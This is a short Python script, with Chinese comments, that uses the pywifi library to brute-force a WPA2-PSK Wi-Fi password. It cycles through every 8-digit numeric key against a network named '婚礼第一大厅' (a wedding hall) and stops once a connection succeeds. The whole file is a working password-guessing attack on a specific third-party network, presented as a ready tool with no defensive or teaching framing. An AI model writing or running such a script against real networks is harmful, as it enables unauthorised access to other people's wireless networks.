import time
import pywifi
from pywifi import const

for i in range(100000000):
    #生成8位数密码
    pwd=str(i).zfill(8)
    print(pwd)
    profile = pywifi.Profile()
    profile.ssid ='婚礼第一大厅' #wifi名称 
    profile.auth = const.AUTH_ALG_OPEN #验证方式
    profile.akm.append(const.AKM_TYPE_WPA2PSK) #加密方式
    profile.cipher = const.CIPHER_TYPE_CCMP    #加密类型
    profile.key=pwd
    wifi = pywifi.PyWiFi()

    iface = wifi.interfaces()[0]
    wedding = iface.add_network_profile(profile)
    #尝试连接
    iface.connect(wedding)
    time.sleep(3)
    if iface.status() == const.IFACE_CONNECTED:
        print('连接成功')
        break
    else:
        print('密码不对')